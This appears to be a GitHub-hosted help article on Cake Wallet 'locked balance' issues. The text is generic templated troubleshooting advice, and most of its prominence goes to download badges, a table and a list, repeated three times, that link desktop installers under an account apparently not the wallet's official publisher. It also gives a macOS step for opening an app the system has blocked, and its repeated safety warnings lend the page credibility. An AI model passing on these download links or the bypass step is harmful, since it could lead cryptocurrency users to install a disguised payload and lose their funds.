<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Cake Wallet Locked Balance</h1>
<p align="center">Some funds may be visible but temporarily unavailable to spend; check wallet state before acting.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

A wallet can show a total that differs from the amount currently available to spend. A locked portion is not necessarily missing: it can reflect funds that are not yet spendable according to wallet state. Allow synchronization to complete and review the wallet’s displayed balance categories. For an apparently empty wallet, see [Cake Wallet balance showing zero](./cake-wallet-balance-zero.md); for a transfer that has not appeared, see [Cake Wallet transaction visibility](./cake-wallet-transaction-not-showing.md).

Avoid repeatedly attempting the same send or changing wallet recovery information to solve a display difference. Check whether the wallet is fully synchronized and whether the activity is recent. If the amount remains unclear, write down what the screen shows without recording or sharing your seed, keys, PIN, or private recovery data. Nobody legitimate asks for these secrets.

## You’ll see this if

- You are setting up or using Cake Wallet Desktop and want a safe, repeatable process.
- The application’s screen differs slightly from a description written for another release.
- You are unsure whether a delay, warning, or missing display means something has gone wrong.
- You want to check a file or wallet state without exposing recovery information.

## Why it happens

Desktop wallet behavior depends on more than the visible screen. The operating system handles downloaded files differently, the wallet needs to scan relevant blockchain history, and the chosen wallet or restore details determine what history it can find. A fresh installation and a restored wallet are different situations: installing the program does not automatically import a wallet, while restoring requires the correct recovery material and scan starting point.

For a restored wallet, restore height is the block height at which scanning starts. An earlier height is safer when you are unsure how old the wallet activity is, but scanning more history takes longer. A later height can miss older activity. Newer wallets may use a different seed format; check the word count your backup shows. MyMonero seeds may contain 13 words in that wallet’s legacy format or 25 words in the standard Monero format. Cake Wallet can restore a MyMonero seed, but you should select the restore path that matches the backup you actually have.

## Fix

1. **Confirm the task and wallet.** Decide whether you are installing, opening, restoring, receiving, sending, or checking history. Make sure you have selected the intended wallet; do not assume a new installation has opened the same wallet you used elsewhere.
2. **Use the project release as your source.** Check the operating-system filename and release context before opening a downloaded program. Avoid links delivered in unsolicited messages. If the operating system raises a warning, do not disable its protections. Confirm the source and checksum first.
3. **Keep the recovery backup private.** Have the correct backup available when restoration is needed, but enter it only in the wallet application on your own device. Never paste it into a website, message, support chat, or screen-sharing session. Nobody legitimate asks you to share a seed.
4. **Choose the matching wallet operation.** Open the appropriate create, open, or restore option in Cake Wallet. For recovery, use the word count and format shown by your own backup. Do not guess at a seed format or change words to make the screen accept them.
5. **Set scanning expectations.** If asked for a restore height, choose a point that includes the wallet’s activity. When uncertain, an earlier height is safer, though it can increase scan time. Leave the application time to synchronize and avoid treating an unfinished scan as a final balance.
6. **Inspect the relevant screen calmly.** Review the wallet identity, sync state, transaction history, and balance categories. For a transfer, verify recipient and amount before confirming; for a receipt, use the address belonging to the intended wallet.
7. **Record only safe troubleshooting details.** Note the operating system, filename, general screen state, and what you already tried. Do not record or share seed words, private keys, PINs, or other secrets in a support request.

> [!TIP]
> Change one thing at a time and give scanning a reasonable opportunity to finish. This makes it easier to tell whether the issue was the selected wallet, file, restore point, or simply incomplete synchronization.

> [!WARNING]
> A person who asks for your seed, private keys, PIN, or remote access is not needed to complete these steps. Stop the conversation and keep recovery information private.

## If that did not work

Re-check the source and exact file name, then compare the file’s SHA-256 with the value published for that same file on the release page. On Windows, use `certutil -hashfile <file> SHA256`; on macOS, use `shasum -a 256 <file>`; on Linux, use `sha256sum <file>`. Compare the complete displayed result with the release listing; do not rely on a checksum copied from elsewhere. No checksum value is reproduced here.

If the issue concerns history or balance, confirm that you are in the expected wallet and allow scanning to proceed. A restore height that is too recent can omit earlier history, while scanning from farther back takes longer. If funds are visible but unavailable, consider that some balance can be locked. Do not sweep funds as a diagnostic step: sweeping means sending all funds to a new wallet and is not a reversible test.

If an operating-system warning appears, pause. Windows SmartScreen may warn about downloaded files; confirm the source and checksum first, and never disable security protections as a workaround. On macOS, the stated way to open the app when blocked is to right-click the app and choose Open. If the file does not match its published checksum, do not open it.

You can review related help without exposing secrets: [Cake Wallet seed recovery](./cake-wallet-restore-13-word-seed.md), [Cake Wallet desktop update checks](./cake-wallet-update-desktop.md), [Cake Wallet backup basics](./cake-wallet-backup-seed.md), [Cake Wallet troubleshooting](./cake-wallet-faq.md), and [the Cake Wallet project on GitHub](https://github.com/Cake-LabsLLC/cake-wallet-desktop). These links are starting points, not a reason to send private information to another person.

## Prevention

Keep your recovery backup private and accessible to you. Never put a seed in public posts or support messages.

When downloading a desktop release, use the project’s release page, match the file to your operating system, and compare its SHA-256 value before opening it. Keep the downloaded filename identifiable. Do not reuse a stale installer just because it is already on the computer; verify that it is the intended release. On system warnings, verify first rather than disabling protections.

For routine use, wait for wallet scanning to settle before relying on history or balances. Check the active wallet before sharing a receive address or preparing a transfer. Review each recipient and amount independently, and never let urgency or a support message replace your own verification. A cautious process is useful even when everything appears normal.

---

## FAQ

<details><summary>Should I share my seed to get help?</summary>

No. Keep your seed, private keys, and PIN private. Nobody legitimate asks you to provide them.

</details>

<details><summary>Does a zero or delayed balance prove that funds are lost?</summary>

No. Check the selected wallet, synchronization, scan range, and transaction history before drawing that conclusion.

</details>

<details><summary>Can I follow exact button names from another release?</summary>

Treat them cautiously. Screens and wording can vary; use the general create, open, restore, receive, send, or settings areas as appropriate.

</details>

<details><summary>Is a checksum a substitute for a trusted source?</summary>

No. Get both the file and its expected checksum from the project release context, then compare them. A checksum match only confirms that the file matches the published value.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Update Cake Wallet Desktop](./cake-wallet-update-desktop.md) | Use the project’s release source, confirm the correct operating-system file, and preserve your recovery backup. |
| [Install Cake Wallet on Windows](./install-cake-wallet-windows.md) | Download and verify the Windows desktop release before opening it. |
| [Install Cake Wallet on macOS](./install-cake-wallet-macos.md) | Download, verify, and open the macOS desktop release safely. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
